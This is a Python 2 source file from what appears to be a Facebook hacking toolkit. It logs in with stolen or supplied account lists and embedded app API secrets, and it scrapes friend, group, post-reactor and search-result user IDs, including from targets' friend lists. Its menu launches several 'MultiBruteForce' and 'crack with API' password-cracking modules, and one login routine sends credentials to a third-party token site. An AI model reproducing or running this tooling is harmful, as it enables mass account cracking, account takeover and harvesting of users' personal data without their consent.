import threading
import mechanize
import bs4,re,sys,time,hashlib
import os,json
import requests
from data.color import *
from data import dumps_group
from data import cache
from data import multiBruteforce
import interpreter
import subprocess as kontolatos
from multiprocessing.pool import ThreadPool
import sys,os
import requests
import interpreter
from data import token
from data.color import *
from multiprocessing.pool import ThreadPool
from data import api_bruteforce

class searchnamez(object):
	def __init__(self):
		self.ok=0
		self.fail=0
		self.found=[]
		self.file()
		
	def file(self):
		try:
			self.a=open(
				raw_input("%s[?]%s account list: "%(
			G,N))).read().splitlines()
		except Exception as e:
			print "%s[!]%s %s"%(R,N,e)
			self.file()
		self.q()
		
	def q(self):
		self.query=raw_input("%s[?]%s Query: "%(G,N)).lower()
		if self.query =="":
			self.q()
		else:
			self.fl()
			
	def fl(self):
		try:
			self.filename=raw_input("%s[?]%s result file name: "%(G,N)).lower()
			if self.filename =="":
				self.fl()
			else:
				open("out/%s"%(self.filename),"w").close()
		except Exception as e:
			print "%s[!]%s %s"%(R,N,e)
			self.fl()
		self.thread()
		
	def thread(self):
		try:
			self.t=ThreadPool(input("%s[?]%s Thread: "%(
				G,N)))
		except Exception as e:
			print "%s[!]%s %s"%(R,N,e)
			self.thread()
		print "%s[*]%s output: out/%s"%(G,N,self.filename)
		self.t.map(self.run,self.a)
		if len(self.found) !=0:
			print "\n%s[*]%s %s id result written"%(G,N,len(self.found))
			print "\n%s[*]%s Result saved to: out/%s"%(G,N,self.filename)
			raw_input("\n[+] finished.\npress enter to menu...")
			interpreter.ASU()
		else:
			print "\n%s[!]%s No result found."%(R,N)
			os.remove("out/%s"%(self.filename))
			raw_input("[+] finished.\npress enter to menu...")
			interpreter.ASU()
			
	
	def run(self,a):
		self.ok+=1
		f=token.token(a)
		if f is False:
			self.fail+=1
		else:
			self.grab(f)
			
	def grab(self,token):
		for i in requests.get("https://graph.facebook.com/me/friends?access_token=%s"%(token),headers={"User-Agent":"Mozilla/5.0 (Linux; Android 5.1; PICOphone_M4U_M2_M Build/LMY47D; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/43.0.2357.121 Mobile Safari/537.36"}).json()["data"]:
			try:
				if self.query in i["name"].lower():
					self.found.append(i["id"])
					open("out/%s"%(self.filename),"a").write("%s\n"%(i["id"]))
			except:pass
		print "\r[*] Searching %s/%s Found: %s"%(
			self.ok,len(self.a),len(self.found)),;sys.stdout.flush()


cache.cleanCache()

def od():
	if os.path.exists("out"):
		pass
	else:
		os.mkdir("out")
	
def tod():
	if os.path.exists("out"):
		if os.path.exists("out/jumping"):
			pass
		else:
			os.mkdir("out/jumping")
	else:
		os.mkdir("out")
		os.mkdir("out/jumping")
		
def ok():
	if os.path.exists("out"):
		open("out/myfriends.txt","w").close()
	else:
		os.mkdir("out")
		open("out/myfriends.txt","w").close()

class massdumps(object):
	def __init__(self):
		self.a=[]
		self.b=[]
		self.c=0
		if os.path.exists("out"):
			pass
		else:
			os.mkdir("out")
		print "%s[*]%s sparator: |"%(G,N)
		self.f()
		
	def f(self):
		try:
			self.ak=open(raw_input("%s[?]%s Account List: "%(G,N))).read().splitlines()
		except Exception as e:
			print "%s[!]%s %s"%(R,N,e)
			self.f()
		print "%s[*]%s total: %s account."%(G,N,len(self.ak))
		ThreadPool(10).map(self.create,self.ak)
		print "\n[+] finished."
		raw_input("press enter to menu...")
		interpreter.ASU()
		
	def create(self,a):
		f=a.split("|")
		API_SECRET = '62f8ce9f74b12f84c123cc23437a4a32'
		data = {
			"api_key":"882a8490361da98702bf97a021ddc14d",
			"credentials_type":"password",
			"email":f[-0],"format":"JSON", "generate_machine_id":"1",
			"generate_session_cookies":"1",
			"locale":"en_US","method":"auth.login",
			"password":f[-1],"return_ssl_resources":"0","v":"1.0"
		}
		sig = 'api_key=882a8490361da98702bf97a021ddc14dcredentials_type=passwordemail='+f[-0]+'format=JSONgenerate_machine_id=1generate_session_cookies=1locale=en_USmethod=auth.loginpassword='+f[-1]+'return_ssl_resources=0v=1.0'+API_SECRET
		x = hashlib.new('md5')
		x.update(sig)
		data.update({'sig':x.hexdigest()})
		try:
			self.go(requests.get(
					'https://api.facebook.com/restserver.php',
			params=data,headers={"User-Agent":"Mozilla/5.0 (Linux; Android 5.1; PICOphone_M4U_M2_M Build/LMY47D; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/43.0.2357.121 Mobile Safari/537.36"}).json()["access_token"],a)
		except:pass
		
	def go(self,t,a):
		s=[]
		try:
			k=open("out/"+a.split("|")[-0]+".txt","w")
			for x in requests.get("https://graph.facebook.com/me/friends?access_token=%s"%(t),headers={"User-Agent":"Mozilla/5.0 (Linux; Android 5.1; PICOphone_M4U_M2_M Build/LMY47D; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/43.0.2357.121 Mobile Safari/537.36"}).json()["data"]:
				k.write("%s\n"%(x["id"]))
			k.close()
			print "[out/%s.txt]> %s%s%s friend writted."%(a.split("|")[-0],G,len(open("out/%s.txt"%(a.split("|")[-0])).read().splitlines()),N)
		except Exception as f:
			print f
			
# grab id by post

class grabidbypost(object):
	def __init__(self):
		self.i="https://mbasic.facebook.com/{}"
		self.req=requests.Session();self.req.headers.update({'User-Agent':'Mozilla/5.0 (Linux; Android 5.1; PICOphone_M4U_M2_M Build/LMY47D; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/43.0.2357.121 Mobile Safari/537.36'})
		config=open("config/config.json").read()
		self.config=json.loads(config)
		self.login()
	
	def back(self):
		raw_input("\npress enter to menu ...")
		interpreter.ASU()
	def file(self):
		print("* example: id.txt")
		if os.path.exists("out"):
			try:
				self.fl=raw_input("[?] filename: ")
				open("out/%s"%(self.fl),"w").close()
			except Exception as e:
				print("%s[!]%s %s"%(R,N,e))
				self.file()
		else:
			os.mkdir("out")
			self.file()
		
	def login(self):
		s=self.req.post(self.i.format("login"),
			data={
				"email":self.config["email"],
				"pass":self.config["pass"]
		}).url
		if "save-device" in s or "m_sess" in s:
			self.id()
		else:exit("%s[!]%s login failed."%(R,N))
		
	def id(self):
		url=[]
		self.d=raw_input("[?] POST URL: ")
		if self.d =="":
			self.id()
		if not "mbasic" in self.d:
			print "[!] get the post from mbasic.facebook pls"
			self.id()
		s=self.req.get(self.d)
		if s.status_code ==200:
			bs=bs4.BeautifulSoup(s.text,"html.parser")
			for x in bs.find_all("a",href=True):
				if "reaction/profile/browser" in x["href"]:
					url.append(self.i.format(x["href"]))
			if len(url) !=0:
				self.file()
				self.g(url[0])
			else:
				print("[!] unknown post.")
		else:
			print("[!] unknown post.")
		self.back()
			
	def g(self,url):
		vs=bs4.BeautifulSoup(self.req.get(url).text,"html.parser")
		for x in vs.find_all("a",href=True):
			f=str(x["href"]).split("/")
			f.remove("")
			if len(f) ==1:
				if "story" in f[0] or "home" in f[0]:
					pass
				else:
					if "profile.php" in f[0]:
						if "&" in f[0]:
							open("out/%s"%(self.fl),"a").write("%s\n"%(
								f[0].replace("profile.php?id=",
									"").replace("&","")))
						z=re.findall('profile.php\?id=(.*?)$',f[0])
						if len(z) !=0:
							open("out/%s"%(self.fl),"a").write("%s\n"%(z[0]))
					else:
						open("out/%s"%(self.fl),"a").write("%s\n"%(f[0]))
					print("\r%s*%s GET: %s id..."%(
						G,N,len(open("out/%s"%(self.fl)).read().splitlines()))),;sys.stdout.flush()
			if "lihat selengkapnya" in x.text.lower():
				self.g(self.i.format(x["href"]))

# jumping
class jamping:
	def __init__(self):
		od()
		tod()
		self.token=""
		config=open("config/config.json").read()
		self.config=json.loads(config)
		self.i="https://mbasic.facebook.com/{}"
		self.k="https://graph.facebook.com/{}"
		self.req=requests.Session()
		self.login()
	
	def login(self):
		self.r=requests.get("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email={}&locale=en_US&password={}&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6".format(self.config["email"],self.config["pass"]),headers={"User-Agent":"Mozilla/5.0 (Linux; Android 5.1; PICOphone_M4U_M2_M Build/LMY47D; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/43.0.2357.121 Mobile Safari/537.36"}).json()
		try:
			self.r["access_token"]
			print("[%s*%s] Login Success.."%(G,N))
			print("[%s*%s] Dumping  id ..."%(G,N))
		except Exception as e:
			sys.exit("%s[!]%s Login Failed."%(R,N))
		self.dumps()
		
	def dumps(self):
		ids=[]
		for x in requests.get(self.k.format(
			"me/friends?access_token=%s"%(
				self.r["access_token"])),headers={"User-Agent":"Mozilla/5.0 (Linux; Android 5.1; PICOphone_M4U_M2_M Build/LMY47D; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/43.0.2357.121 Mobile Safari/537.36"}).json()["data"]:
			ids.append(x["id"])
		print("%s[*]%s total friends: %s"%(G,N,len(ids)))
		self.tanya(ids)
		
	def tanya(self,ids):
		try:
			self.s=input("%s[*]%s how many friends you want to jump? "%(G,N))
			if self.s > len(ids):
				print("%s[!]%s to many number!"%(R,N))
				return self.tanya(ids)
		except Exception as e:
			print("%s[!]%s %s"%(e))
			return self.tanya(ids)
		print "%s[*]%s PRESS CTRL+C TO NEXT"%(G,N)#
		fixid=[]
		for x in ids:
			fixid.append(x)
			if len(fixid) ==self.s:
				break
		self.lgin(fixid)
		
	
	def lgin(self,fixid):
		s=self.req.post(self.i.format("login"),
			data=
				{
					"email":self.config["email"],
					"pass":self.config["pass"]
				}
		).url
		if "save-device" in s or "m_sess" in s:
			for x in fixid:
				try:
					self.data(x)
				except:
					print "\n"+"-"*50
					continue
		else:exit("%s[!]%s failed when login."%(R,N))
			
	def data(self,x):
		datas=[]
		bs=bs4.BeautifulSoup(
			self.req.get(self.i.format(x),timeout=10).text,
		features="html.parser")
		self.names=bs.find("title").renderContents()
		open("out/jumping/"+self.names[0:10].replace(" ","_")+".txt","w").close()
		for x in bs.find_all("a",href=True):
			if "/friends?lst=" in x["href"]:
				datas.append(x["href"])
				break
		
		if len(datas) !=0:
			print "\n%s[*]%s dumps from : %s.."%(G,N,self.names[0:30])
			print "%s[*]%s output     : out/jumping/%s.txt"%(G,N,self.names[0:10].replace(" ","_"))
			self.dump(datas[0])
		
	def dump(self,datas):
		bs=bs4.BeautifulSoup(
			self.req.get(self.i.format(datas),timeout=10).text,
		features="html.parser")
		for i in bs.find_all("a",href=True):
			ppp=len(open("out/jumping/"+self.names[0:10].replace(" ","_")+".txt").readlines())
			print("\r%s[*]%s [%s%s%s] writing id ..."%(G,N,R,ppp,N)),;sys.stdout.flush()
			if "fref" in i["href"]:
				a=re.findall("/(.*?)\?fref","%s"%(i["href"]))
				if len(a) !=0:
					open("out/jumping/"+self.names[0:10].replace(" ","_")+".txt","a").write(a[0]+"\n")
			if "profile.php" in i["href"]:
				b=re.findall("php\?id=(.*?)&","%s"%(i["href"]))
				if len(b) !=0:
					open("out/jumping/"+self.names[0:10].replace(" ","_")+".txt","a").write(b[0]+"\n")
			if "/friends?unit_cursor" in i["href"]:
				self.dump(i["href"])
				break
		if os.path.getsize("out/jumping/"+self.names[0:10].replace(" ","_")+".txt") !=0:
			print "\n"+"-"*50
		else:
			print "\n%s[!]%s can't looking friends!"%(R,N)
			os.remove("out/jumping/"+self.names[0:10].replace(" ","_")+".txt")
			print "\n"+"-"*50

class dumpper:
	def __init__(self):
		od()
		self.token=""
		self.req=requests.Session();self.req.headers.update({'User-Agent':'Mozilla/5.0 (Linux; Android 5.1; PICOphone_M4U_M2_M Build/LMY47D; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/43.0.2357.121 Mobile Safari/537.36'})
		config=open("config/config.json").read()
		self.config=json.loads(config)
		self.i="https://mbasic.facebook.com/{}"
		self.a="https://graph.facebook.com/{}"
		self.login()
		
	def login(self):
		self.r=requests.get("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email={}&locale=en_US&password={}&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6".format(self.config["email"],self.config["pass"]),headers={"User-Agent":"Mozilla/5.0 (Linux; Android 5.1; PICOphone_M4U_M2_M Build/LMY47D; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/43.0.2357.121 Mobile Safari/537.36"}).json()
		try:
			self.token=self.r["access_token"]
			print("[%s*%s] Login Success."%(G,N))
		except:
			exit("%s[!]%s login failed."%(R,N))
		self.search()
		
	def search(self):
		self.q=raw_input("%s[?]%s search query: "%(G,N))
		if self.q =="":
			return self.search()
		self.s()
		
	def s(self):
		fr=[]
		print 
		for x in requests.get(
			self.a.format(
				"me/friends?access_token=%s"%(
					self.token)),headers={"User-Agent":"Mozilla/5.0 (Linux; Android 5.1; PICOphone_M4U_M2_M Build/LMY47D; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/43.0.2357.121 Mobile Safari/537.36"}).json()["data"]:
			if self.q.lower() in x["name"].lower():
				fr.append(x["id"])
				print "%s. %s"%(len(fr),
					x["name"].lower().replace(
						self.q.lower(),"%s%s%s"%(R,
							self.q.lower(),N)))
		if len(fr) ==0:
			print("%s[!]%s no result found."%(R,N))
			return self.search()
		self.pilih(fr)
		
	def pilih(self,fr):
		try:
			self.n=input("\n%s[?]%s select number: "%(G,N))
		except Exception as f:
			print("%s[!]%s %s"%(R,N,f))
			return self.pilih(fr)
		self.lokin(fr)
			
	def lokin(self,fr):
		s=self.req.post(self.i.format("login"),
		data=
			{
				"email":self.config["email"],
				"pass":self.config["pass"]
			}
		).url
		if "save-device" in s or "m_sess" in s:
			self.crawl(self.i.format(fr[self.n-1]))
		else:exit("%s[!]%s failed when login."%(R,N))
		
	def crawl(self,id):
		print("%s[*]%s loking friends..."%(G,N))
		bs=bs4.BeautifulSoup(
			self.req.get(id).text,features="html.parser")
		for x in bs.find_all("a",href=True):
			if "friends?lst=" in x["href"]:
				self.grep(self.i.format(x["href"]))
				break
	def grep(self,x):
		bs=bs4.BeautifulSoup(self.req.get(x).text,
		features="html.parser")
		b=bs.find("title").renderContents()
		out="out/"+b.replace(" ","_")+".txt"
		print("%s[*]%s target name : %s"%(G,N,b))
		print("%s[*]%s output      : %s"%(G,N,out))
		open(out,"w").close()
		self.grab(x,out)
		
	def grab(self,x,out):
		bs=bs4.BeautifulSoup(
			self.req.get(x).text,
		features="html.parser")
		for x in bs.find_all("a",href=True):
			print "\r[%s%s%s] writing id ..."%(R,len(open(out).readlines()),N),;sys.stdout.flush()
			if "fref" in x["href"]:
				a=re.findall("/(.*?)\?fref","%s"%(x["href"]))
				if len(a) !=0:
					open(out,"a").write(a[0]+"\n")
			if "profile.php" in x["href"]:
				b=re.findall("php\?id=(.*?)&","%s"%(x["href"]))
				if len(b) !=0:
					open(out,"a").write(b[0]+"\n")
			if "/friends?unit_cursor" in x["href"]:
				self.grab(self.i.format(x["href"]),out)
		if os.path.getsize(out) !=0:
			raw_input("\npress enter to menu...")
			interpreter.ASU()
		else:
			print "%s[!]%s can't looking friends!"%(R,N)
			os.remove(out)
			raw_input("\npress enter to menu...")
			interpreter.ASU()
		
					
class me:
	def __init__(self):
		ok()
		self.i="https://graph.facebook.com/{}"
		config=open("config/config.json").read()
		self.config=json.loads(config)
		self.q=[]
		self.login()
	def login(self):
		try:
			self.token=requests.get(
			bs4.BeautifulSoup(requests.post(
				"https://m.autolikeus.me/token.get.php",
			data={"username":self.config["email"],
				"password":self.config["pass"]}).text,
			features="html.parser").find(
				"iframe")["src"]).json()["access_token"]
		except:
			exit("%s[!]%s login failed."%(R,N))
		for x in requests.get(
			self.i.format("me/friends?access_token=%s"%(
				self.token)),headers={"User-Agent":"Mozilla/5.0 (Linux; Android 5.1; PICOphone_M4U_M2_M Build/LMY47D; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/43.0.2357.121 Mobile Safari/537.36"}).json()["data"]:
			open("out/myfriends.txt","a").write(x["id"]+"\n")
			print("\r[+] %s ID Writted..."%(len(open(
				"out/myfriends.txt").read().splitlines()
			))),;sys.stdout.flush()
		print("\n[*] Output out/myfriends.txt")



class searchname:
	def __init__(self):
		od()
		config=open("config/config.json").read()
		self.config=json.loads(config)
		self.login()
		
	def login(self):
		try:
			self.token=requests.get(
			bs4.BeautifulSoup(requests.post(
				"https://m.autolikeus.me/token.get.php",
			data={"username":self.config["email"],
				"password":self.config["pass"]}).text,
			features="html.parser").find(
				"iframe")["src"]).json()["access_token"]
		except:
			exit("%s[!]%s login failed."%(R,N))
		self.q()
		
	def q(self):
		self.query=raw_input("[%s*%s] Query: "%(G,N))
		if self.query == "":
			return self.q()
		self.lot()
	def lot(self):
		found=[]
		k=requests.get("https://graph.facebook.com/me/friends?access_token=%s"%(self.token),headers={"User-Agent":"Mozilla/5.0 (Linux; Android 5.1; PICOphone_M4U_M2_M Build/LMY47D; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/43.0.2357.121 Mobile Safari/537.36"}).json()
		for x in k["data"]:
			if self.query in x["name"].lower():
				found.append(x["id"])
				print("%s[%s] %s %s"%(G,len(found),N,x["name"].lower().replace(self.query.lower(),"%s%s%s"%(R,self.query,N))))
		
		if len(found) !=0:
			print("\n[%sFound%s]: %s"%(G,N,len(found)))
			r=raw_input("[%s?%s] Write? y/n: "%(R,N))
			if r.lower() !="y":
				return self.query()
			else:
				n=raw_input("[%s?%s] File name: "%(R,N))
				for x in found:
					open("out/"+n,"a+").write(x+"\n")
				print("[%s*%s] Output: out/%s"%(G,N,n))
				
def tol():
	if os.path.exists("out/search.txt"):
		if os.path.getsize("out/search.txt") !=0:
			print "[%s*%s] File Exists: out/search.txt"%(R,N)
			o=raw_input("[%s?%s] Append id? y/n?): "%(R,N))
			if o.lower() !="y":
				print "%s[*]%s output: out/search.txt"%(G,N)
				open("out/search.txt","w").close()
			else:
				print "%s[*]%s output: out/search.txt"%(G,N)
		else:
			open("out/search.txt","w").close()
	else:
		print "%s[*]%s output: out/search.txt"%(G,N)
		open("out/search.txt","w").close()
		
class search_people(object):
	def __init__(self):
		self.req=requests.Session();self.req.headers.update({'User-Agent':'Mozilla/5.0 (Linux; Android 5.1; PICOphone_M4U_M2_M Build/LMY47D; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/43.0.2357.121 Mobile Safari/537.36'})
		config=open("config/config.json").read()
		self.config=json.loads(config)
		self.i="https://mbasic.facebook.com/{}"
		self.login()
		
	def login(self):
		s=self.req.post(self.i.format("login"),
			data=
				{
					"email":self.config["email"],
					"pass":self.config["pass"]
				}
		).url
		if "save-device" in s or "m_sess" in s:
			self.q()
		else:
			exit("%s[!]%s login failed."%(R,N))
			
	def q(self):
		self.query=raw_input("%s[?]%s Query: "%(G,N))
		if self.query =="":
			self.q()
		else:
			od()
			tol()
			loli=[]
			bs=bs4.BeautifulSoup(
				self.req.get(
					self.i.format("search/top/?q=%s"%(
			self.query))).text,features="html.parser")
			for x in bs.find_all("a",href=True):
				if "graphsearch" in x["href"]:
					loli.append(self.i.format(x["href"]))
			if len(loli) !=0:
				self.cari(loli[0])
			else:
				print("[!] no result found.")
				
	def cari(self,url):
		bs=bs4.BeautifulSoup(self.req.get(url).text,
			features="html.parser")
		for x in bs.find_all("a",href=True):
			p=x.find("div")
			if "None" in str(p) or "+" in str(p):
				continue
			else:
				js=re.findall("/(.*?)$",x["href"])
				if len(js) !=0:
					print "\r%s[*]%s %s                          "%(G,N,p.text)
					open("out/search.txt","a+").write(
						"%s\n"%(
							js[0].replace("profile.php?id=","")))
					print "\r[%s%s%s] Writing .. "%(
							R,len(open("out/search.txt").readlines()),N),;sys.stdout.flush()
		for xi in bs.find_all("a",href=True):
			if "lihat hasil selanjutnya" in xi.text.lower():
				self.cari(xi["href"])
		exit("\n[+] finished.")
		
				
class pilihan():
	def __init__(self):
		print "\n\t[ Select Actions ]\n"
		print "{%s00%s} Dump ID from searchname by account list"%(G,N)
		print "{%s01%s} Dump ID from your friends"%(G,N)
		print "{%s02%s} Robber ID from targets friend"%(G,N)
		print "{%s03%s} JUMPING"%(G,N)
		print "{%s04%s} Dump ID From GROUP"%(G,N)
		print "{%s05%s} Dump ID From Friends Search Name Query"%(G,N)
		print "{%s06%s} Dump ID by explore search name query"%(G,N)
		print "{%s07%s} Dump ID by Public POST"%(G,N)
		print "{%s08%s} Mass Dump ID by Account List"%(G,N)
		print "{%s09%s} Multi BruteForce (Low Level) "%(G,N)
		print "{%s10%s} MultiBruteForce v.2 (Crack With One Passwords)"%(G,N)
		print "{%s11%s} MultiBruteForce v.3 (Crack More Than 1 Password)"%(G,N)
		print "{%s12%s} MultiBruteForce v.4 (Auto BruteForce Friendlists)"%(G,N)
		print("{%s13%s} MultiBruteForce v.5 (Auto BruteForce ID)"%(G,N))
		print "{%s14%s} CRACK WITH API"%(G,N)
		print "{%s15%s} Back To Menu Options\n"%(R,N)
		f=raw_input("%s[%s+%s]%s Actions>> "%(G,R,G,N))
		if f =="0" or f =="00":
			searchnamez()
		if f == "1" or f == "01":
			self.a()
			
		elif f == "2" or f == "02":
			self.b()
			raw_input("press enter to menu ...")
			interpreter.ASU()
		elif f == "3" or f == "03":
			self.c()
			raw_input("press enter to menu ...")
			interpreter.ASU()
		elif f == "4" or f == "04":
			self.newmodule()
			raw_input("press enter to menu ...")
			interpreter.ASU()
		elif f == "5" or f == "05":
			self.newmodule1()
			raw_input("press enter to menu ...")
			interpreter.ASU()
		elif f == "6" or f == "06":
			self.serpipel()
			raw_input("press enter to menu ...")
			interpreter.ASU()
		elif f == "7" or f == "07":
			grabidbypost()

		elif f == "8" or f == "08":
			massdumps()


		elif f =="9" or f =="09":
			self.d()
			raw_input("press enter to menu ...")
			interpreter.ASU()
			
		elif f =="10":
			multiBruteforce.prepare()
			raw_input("press enter to menu...")
			interpreter.ASU()

		elif f =="11":
			multiBruteforce.embeep()
			
			raw_input("press enter to menu ...")
			interpreter.ASU()

		elif f =="12":
			multiBruteforce.autoBrute()
			
			raw_input("press enter to menu...")
			interpreter.ASU()
		elif f =="13":
			multiBruteforce.autoburut()
			raw_input("press enter to menu...")
			interpreter.ASU()
		elif f =="14":
			api_bruteforce.menu()
		elif f =="15":
			raw_input("press enter to menu ...")
			interpreter.ASU()
		else:
			print("%s[!]%s Invalid options!"%(R,N))
			raw_input("press enter to menu ...")
			interpreter.ASU()
		
	def serpipel(self):
		search_people()
		
	def a(self):
		me()
		
	def b(self):
		dumpper()
	
	def c(self):
		jamping()
		
	def d(self):
		multiBruteforce._prepares()
		
	def newmodule(self):
		print("\n\t [ Select Actions ]\n")
		print("{%s01%s} Dump id from group\n"%(G,N))
		c=raw_input("%s[%s+%s]%s Actions>> "%(G,R,G,N))
		if (c == "1" or c == "01"):
			dumps_group.dumps_group()
			interpreter.ASU()
		else:
			exit("%s[!]%s invalid option"%(R,N))
			raw_input("press enter to menu ...")
			interpreter.ASU()
		
	def newmodule1(self):
		searchname()

